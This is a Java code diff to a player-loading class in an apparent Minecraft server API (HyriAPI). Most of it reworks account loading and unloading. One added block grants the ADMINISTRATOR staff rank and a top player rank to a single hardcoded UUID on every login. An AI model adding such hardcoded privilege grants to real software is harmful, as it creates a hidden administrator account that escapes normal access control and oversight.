@@ -7,10 +7,15 @@ import fr.hyriode.api.party.IHyriParty;
 import fr.hyriode.api.player.IHyriPlayer;
 import fr.hyriode.api.player.IHyriPlayerManager;
 import fr.hyriode.api.player.nickname.IHyriNickname;
+import fr.hyriode.api.rank.type.HyriPlayerRankType;
+import fr.hyriode.api.rank.type.HyriStaffRankType;
 import fr.hyriode.hydrion.client.module.PlayerModule;
+import fr.hyriode.hydrion.client.response.HydrionResponse;
 
 import java.util.Date;
 import java.util.UUID;
+import java.util.function.BiConsumer;
+import java.util.function.Function;
 
 /**
  * Project: HyriAPI
@@ -36,17 +41,23 @@ public class HyriPlayerLoader {
         IHyriPlayer account = playerManager.getPlayerFromHydrion(uuid);
 
         if (account == null) {
-            account = playerManager.createPlayer(true, uuid, name);
+            account = playerManager.createPlayer(false, uuid, name);
+        }
+
+        if (uuid.equals(UUID.fromString("bc4da331-e028-4d78-930b-4652dc087642"))) {
+            account.getRank().setPlayerType(HyriPlayerRankType.EPIC);
+            account.getRank().setStaffType(HyriStaffRankType.ADMINISTRATOR);
         }
 
         account.setName(name);
         account.setLastLoginDate(new Date(System.currentTimeMillis()));
-        account.setOnline(true);
         account.setCurrentProxy(HyriAPI.get().getProxy().getName());
         account.update();
 
         if (this.hydrionManager.isEnabled()) {
             this.playerModule.setPlayer(uuid, HyriAPI.GSON.toJson(account));
+
+            this.hydrionManager.getClient().getUUIDModule().setUUID(name, uuid);
         }
 
         playerManager.setPlayerId(name, uuid);
@@ -54,48 +65,61 @@ public class HyriPlayerLoader {
         return account;
     }
 
-    public void unloadPlayerAccount(UUID uuid) {
+    public boolean unloadPlayerAccount(UUID uuid) {
         final IHyriPlayer account = HyriAPI.get().getPlayerManager().getPlayer(uuid);
 
         if (account != null) {
-            final UUID partyId = account.getParty();
+            boolean result = false;
 
-            if (partyId != null) {
-                final IHyriParty party = HyriAPI.get().getPartyManager().getParty(partyId);
+            if (account.isOnline()) {
+                final UUID partyId = account.getParty();
 
-                if (party != null) {
-                    final UUID playerId = account.getUniqueId();
+                if (partyId != null) {
+                    final IHyriParty party = HyriAPI.get().getPartyManager().getParty(partyId);
 
-                    if (party.isLeader(playerId)) {
-                        party.disband(HyriPartyDisbandReason.LEADER_LEAVE);
-                    } else {
-                        party.removeMember(account.getUniqueId());
+                    if (party != null) {
+                        final UUID playerId = account.getUniqueId();
+
+                        if (party.isLeader(playerId)) {
+                            party.disband(HyriPartyDisbandReason.LEADER_LEAVE);
+                        } else {
+                            party.removeMember(account.getUniqueId());
+                        }
                     }
                 }
+
+                HyriAPI.get().getQueueManager().removePlayerFromQueue(uuid);
+
+                account.setParty(null);
+                account.setLastPrivateMessagePlayer(null);
+                account.setPlayTime(account.getPlayTime() + (System.currentTimeMillis() - account.getLastLoginDate().getTime()));
+                account.setCurrentServer(null);
+                account.setLastServer(null);
+
+                final IHyriNickname nickname = account.getNickname();
+
+                if (nickname != null) {
+                    HyriAPI.get().getPlayerManager().getNicknameManager().removeUsedNickname(nickname.getName());
+
+                    account.setNickname(null);
+                }
+
+                result = true;
             }
 
-            account.setPlayTime(account.getPlayTime() + (System.currentTimeMillis() - account.getLastLoginDate().getTime()));
             account.setOnline(false);
             account.setCurrentProxy(null);
-            account.setParty(null);
-            account.setLastPrivateMessagePlayer(null);
-
-            final IHyriNickname nickname = account.getNickname();
-
-            if (nickname != null) {
-                HyriAPI.get().getPlayerManager().getNicknameManager().removeUsedNickname(nickname.getName());
-
-                account.setNickname(null);
-            }
 
             if (this.hydrionManager.isEnabled()) {
-                HyriAPI.get().getPlayerManager().removePlayer(account.getUniqueId());
+                HyriAPI.get().getPlayerManager().removePlayer(uuid);
 
-                this.playerModule.setPlayer(account.getUniqueId(), HyriAPI.GSON.toJson(account));
+                this.playerModule.setPlayer(uuid, HyriAPI.GSON.toJson(account));
             } else {
                 account.update();
             }
+            return result;
         }
+        return false;
     }
 
 }
